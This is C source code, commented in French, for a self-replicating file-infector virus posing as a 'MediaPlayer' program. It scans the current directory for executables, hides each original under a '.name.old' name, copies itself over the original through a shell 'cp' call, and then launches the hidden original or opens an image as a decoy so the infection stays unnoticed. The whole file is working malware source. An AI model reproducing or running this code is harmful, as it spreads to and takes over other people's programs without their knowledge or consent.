#include <stdlib.h>
#include<stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>

int main(int argc, char** argv)
{
//SCAN DU DOSSIER COURANT

	struct dirent *lecture;
 	DIR *rep;
    	rep = opendir("." );
	struct stat *buf = NULL;
	buf = malloc(sizeof(struct stat));
	//char fichierCourant[] = __FILE__;
	char *fichierCourant = argv[0]+2;
    	char *pDot = strchr(fichierCourant, '.');
    	if(pDot!=NULL)
        	*pDot = '\0';	

    while ((lecture = readdir(rep))) {
		stat(lecture->d_name, buf);
		//Si le fichier est exécutable et régulier
		if(S_ISREG(buf->st_mode) && buf->st_mode & S_IXUSR){
			//Si il ne s'agit pas du fichier courant et si il n'a pas l'ext old
			if(strcmp (lecture->d_name,fichierCourant) != 0 && strstr(lecture->d_name,".old") == NULL && strcmp (lecture->d_name,"MediaPlayer") != 0 ){
				//Si le fichier n'a pas déjà été infecté
				char *fichierInfecte = NULL;
				fichierInfecte=(char *)malloc((strlen(lecture->d_name)+strlen(".old"))+2);
				strcpy(fichierInfecte,".");	
				strcat(fichierInfecte,lecture->d_name);
				strcat(fichierInfecte,".old");
				if(stat(fichierInfecte,buf)!=0){
					//Print pour vérifier les fichiers cibles 
					printf("%s\n", lecture->d_name);
					//INFECTION
					//Rename les utilitaires en ajoutant .old
					  if (rename(lecture->d_name, fichierInfecte) == 0)
    					  {
        					//OK
    					  }
					//Copie du programme en le renommant par le nom du fichier
					char *param = NULL;
					param=(char *)malloc((strlen("cp")+strlen(lecture->d_name)+strlen(fichierCourant))+3);
					strcpy(param,"cp ");
					strcat(param,fichierCourant);
					strcat(param," ");
					strcat(param, lecture->d_name);
					(void)system(param);
					free(param);
					free(fichierInfecte);			
				}
			
			}
		}
	}
	
	
	free(buf);
	closedir(rep);
	
	
    	
	// S'il s'agit du media player, on le lance, sinon on lance le pg sain
	if(strcmp (fichierCourant,"MediaPlayer") == 0){
   		lancerProgramme("/usr/bin/eog ");
	}
	else{
		strcat(fichierCourant,".old");
		char *prog = NULL;
		prog=(char *)malloc(strlen(fichierCourant)+strlen("./")+2);
		strcpy(prog,"./.");
		strcat(prog,fichierCourant);
		printf("%s",prog);
		lancerProgramme(prog);
		free(prog);
	}
    return(0);
}




int lancerProgramme(const char *path){
    if(strcmp (path,"/usr/bin/eog ") == 0){
	    struct dirent *lecture;
	    DIR *rep;
	    rep = opendir("." );
	    int continuer = 1; // arrête la boucle quand on a trouvé une photo
	    while (continuer && (lecture = readdir(rep))) {
			if(strstr(lecture->d_name, ".tif") != NULL || strstr(lecture->d_name, ".jpg") != NULL || strstr(lecture->d_name, ".png") != NULL){
				
				char *param=NULL;
				param = (char *)malloc((strlen(path)+strlen(lecture->d_name))+1);
				strcpy(param,path);
				strcat(param,lecture->d_name);
				(void)system(param);
				continuer=0;
			}
	
	    }
	    closedir(rep);
	   
		if(continuer){ // Si il n'y a pas de photo, on ouvre le player sans paramètre
		    (void)system(path);
		}
	}
	else{
	(void)system(path);
	}

	return 0;
}
